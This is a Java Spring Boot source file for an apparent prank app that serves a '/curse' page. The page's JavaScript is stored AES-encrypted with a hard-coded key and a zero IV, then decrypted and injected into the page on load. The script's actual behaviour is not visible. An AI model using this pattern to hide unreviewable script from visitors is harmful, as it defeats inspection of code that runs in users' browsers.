package ajurakudroot.cursed_spring_app;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.spec.KeySpec;
import java.util.Base64;

/**
 * Run and go to localhost:8080/curse
 */

@SpringBootApplication
public class CursedSpringApp {
    public static void main(String[] args) { SpringApplication.run(CursedSpringApp.class, args); }
}

@RestController
class CursedController {

    private final String CURSE = "bp7IdBb0i3bRVoihtVqEj97//2ICLTjPSsvjUy0NzprgZxqAj71W5EBi3hOAS4WiRQ8irgkH+GJkj92tOMg5UO/+jLuH7MsytM/auoh4wYcVuiirr/n5HYkngfOjw12jjgHxiX1axsmsgkDfE1DT4/MCCht7Y9lh8yEQGSPyWYyk+coZ7frgwsFcBd3RVt0f/rf4wSoVm7uHTeTHZFLANAF1N61xOcwl01Zse+3L1qeDUY/47iIqcTr2NoWB/jLqPC86cgTxJe9sw5h7wDQCnP4mmKtpPV2z4WHyAXrxV7y40ApLcIR1fscE5/8/82NBAJnkG9m0BgKLfH9QsSGAvYw083UkgPVLkjSjjFWRZu/RJGqjyRqTzaPJzenHjWzCIPtt74GbWWfzZ90+oOl3iRCpr/wvR6wteyoZZhtJpgQG5jX9c4t7jmSUUYx38A9gA8VHTkDLWnDevPD3e5/84mG1veRxrAmjw5RNLKYj/ZEL7OAmQjHpEhiM9nGg2YA1U3wuEeItzK2LNM3XrVPX77uBUkfc0AHsjlH8fz5M0KuSg8+ke46IUsYZhYldx3CJGJh3aYnNyk7Pz0LYDB7iOO1WXvvinLiEuo0wXzJRXFClVwkr9cJv+z1d/BULD5aEqDW608x9JoFQhdl+EZKJs3Hc2VekT7PanQerhJnezfFPUxZcLpMeUfqAwVgnK1uJoY94PYipWVJVbxfIdTvVVSY6HW6mXy7s5xBK6NjDHWfT+komhaKkhfrQJ20ywQSwg79bv+qPyFqsK2LCNP1/zJ7RslUsjWrxreZ4oSGls7zejU1MGGjh59i0lHAlq6OYSYoVaNK0AwMWGVNE0kJrOHsi6UoSZjXJiy/XoPb6zJ7Idd4wyaH0jO01dj7TuMgPSNm3+JoqCldj0auOCM5IguLZpmbfzfd27AFnwLm8UlwQlWc9WU9uzCrbjBqbONpfQHGTAiQ1oVz5fkVsN1pFS6oGp/KNAGpOfKzoBCj0IADbnOUB7Kzx5zSOhFqd1XRmZBryIqEDGGpDnYKujUtpbc/hVW2hszEMU9P72JAe2mxqxisNRRr6boCVN0MzbMa/wnOoBkgQN+5NpRpQnilDa+qdrX/g7eFjr9ndj4ulyAQFIzQrkeCU+VIIxmfsd+qLg/yMgQoqy6uwTIXv4Rxcl4lyb/F8bjsx/5lTV+vrk4p8gCfSh7OYbw6gzyhLdBBPRyd1ACJ2kxGlQ7sN80ZeHWdf5OPRJZsNg5dFKsiyQuZD2Dkvlnaj6en5TScWUlVLErFoiLRAhvv0QPcmE+lTbE6iv/u9wzHf+bpY62Vk8C2W+ycEdqT2pfJCiNnAaYuBVdi0XBfGxj58ctwZG9L1bJCt3ILs37vyoJ6fHxfYIsnmMu+sBH84QBmKPptHRoWX4+OFIWPdS74fqBW/YeDRGH9OIx0au0H7hPTRLqjxVps/hjbKJPKcCXTAnsewf/iFj8WmCoOfh3ZzDgVzXbqq2McctM0JDnVlQqM0h5vqxHKS7uyj9mKTjKkbh55HeKVkObiKjy8MCDEh7VT2fM+l6g==";

    @GetMapping(value = "/curse", produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
    public String curse() {
        return "<html><header><title>Welcome</title></header><script>" + EEEEE.decrypt(CURSE) + "</script><body></body></html>";
    }

}

class EEEEE {
    private static final String SECRET_KEY = "my_super_secret_key_ho_ho_ho";
    private static final String SALT = "ssshhhhhhhhhhh!!!!";

    public static String decrypt(String strToDecrypt) {
        try {
            byte[] iv = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
            IvParameterSpec ivspec = new IvParameterSpec(iv);

            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
            KeySpec spec = new PBEKeySpec(SECRET_KEY.toCharArray(), SALT.getBytes(), 65536, 256);
            SecretKey tmp = factory.generateSecret(spec);
            SecretKeySpec secretKey = new SecretKeySpec(tmp.getEncoded(), "AES");

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, ivspec);
            return new String(cipher.doFinal(Base64.getDecoder().decode(strToDecrypt)));
        } catch (Exception e) {
            System.out.println("Error while decrypting: " + e.toString());
        }
        return null;
    }
}
